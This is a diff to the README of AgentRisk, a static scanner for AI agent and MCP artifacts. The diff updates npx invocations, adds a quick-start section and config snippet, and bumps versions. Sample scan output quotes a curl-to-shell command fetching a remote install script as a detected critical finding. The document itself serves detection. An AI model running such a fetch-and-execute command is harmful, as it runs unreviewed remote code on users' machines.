@@ -15,10 +15,10 @@ Think of it as a security gate for `.mcp.json`, `AGENTS.md`, `SKILL.md`, Cursor 
 It never connects to MCP servers. It never runs package scripts. It never installs target dependencies. It never asks an LLM to decide whether your workspace is safe.
 
 ```bash
-npx agentrisk scan https://github.com/owner/suspicious-agent-repo
-npx agentrisk scan npm:some-mcp-server@1.2.3
-npx agentrisk scan ./downloaded-agent.tgz
-npx agentrisk mcp
+npx --yes agentrisk@latest scan https://github.com/owner/suspicious-agent-repo
+npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
+npx --yes agentrisk@latest scan ./downloaded-agent.tgz
+npx --yes agentrisk@latest mcp config
 ```
 
 ```text
@@ -36,6 +36,37 @@ CRITICAL
     evidence: bash -c curl https://example.invalid/install.sh | sh
     fix: Pin a reviewed package or binary and avoid curl-to-shell, wget-to-shell, or PowerShell Invoke-Expression bootstraps.
 ```
+
+## Quick Start
+
+Scan a repository, npm package, or local archive without installing AgentRisk:
+
+```bash
+npx --yes agentrisk@latest scan github:owner/repo#main
+npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
+npx --yes agentrisk@latest scan ./downloaded-agent.tgz
+```
+
+Add AgentRisk to an MCP client:
+
+```bash
+npx --yes agentrisk@latest mcp config
+```
+
+That prints a ready-to-copy config:
+
+```json
+{
+  "mcpServers": {
+    "agentrisk": {
+      "command": "npx",
+      "args": ["-y", "agentrisk@latest", "mcp"]
+    }
+  }
+}
+```
+
+Use `pass` as a green light, `review` as human review required, `block` as do not run yet, and `incomplete` as fix parse/read errors before trusting the artifact.
 
 ## Why This Exists
 
@@ -86,8 +117,8 @@ AgentRisk currently discovers:
 Inspect the rule pack:
 
 ```bash
-npx agentrisk rules list
-npx agentrisk rules show mcp-remote-fetch-exec
+npx --yes agentrisk@latest rules list
+npx --yes agentrisk@latest rules show mcp-remote-fetch-exec
 ```
 
 The checked-in corpus currently reports **3/3 benign cases clean** and **5/5 malicious cases detected**. See [docs/corpus-report.md](docs/corpus-report.md), generated with `npm run corpus:evaluate`.
@@ -97,24 +128,24 @@ The checked-in corpus currently reports **3/3 benign cases clean** and **5/5 mal
 Use without installing:
 
 ```bash
-npx agentrisk scan .
+npx --yes agentrisk@latest scan .
 ```
 
 Preflight remote artifacts:
 
 ```bash
 # GitHub repo default branch
-npx agentrisk scan https://github.com/modelcontextprotocol/servers
+npx --yes agentrisk@latest scan https://github.com/modelcontextprotocol/servers
 
 # GitHub shorthand with a ref
-npx agentrisk scan github:owner/repo#v1.2.3
+npx --yes agentrisk@latest scan github:owner/repo#v1.2.3
 
 # npm package tarball, downloaded and extracted without running scripts
-npx agentrisk scan npm:some-mcp-server@1.2.3
+npx --yes agentrisk@latest scan npm:some-mcp-server@1.2.3
 
 # Local or remote tarballs
-npx agentrisk scan ./agent-server.tgz
-npx agentrisk scan https://example.com/agent-server.tar.gz
+npx --yes agentrisk@latest scan ./agent-server.tgz
+npx --yes agentrisk@latest scan https://example.com/agent-server.tar.gz
 ```
 
 For remote, npm, and archive targets, AgentRisk ignores any target-provided `agentrisk.config.json` unless you pass `--config` explicitly. An untrusted artifact should not get to configure away its own scan.
@@ -147,6 +178,7 @@ agentrisk config print [path]
 agentrisk schema config
 agentrisk schema report
 agentrisk mcp
+agentrisk mcp config
 ```
 
 Useful scan flags:
@@ -173,7 +205,13 @@ The server exposes one tool:
 Run it directly:
 
 ```bash
-npx agentrisk@latest mcp
+npx --yes agentrisk@latest mcp
+```
+
+Generate a config snippet:
+
+```bash
+npx --yes agentrisk@latest mcp config
 ```
 
 Example MCP client configuration:
@@ -261,7 +299,7 @@ jobs:
       security-events: write
     steps:
       - uses: actions/checkout@v5
-      - uses: Renga154/agentrisk@v0.2.0
+      - uses: Renga154/agentrisk@v0.2.1
         with:
           format: sarif
           output: agentrisk.sarif
@@ -292,7 +330,7 @@ jobs:
       - uses: actions/setup-node@v5
         with:
           node-version: 22
-      - run: npx agentrisk@0.2.0 scan . --format sarif --output agentrisk.sarif
+      - run: npx --yes agentrisk@0.2.1 scan . --format sarif --output agentrisk.sarif
       - uses: github/codeql-action/upload-sarif@v3
         if: always()
         with:
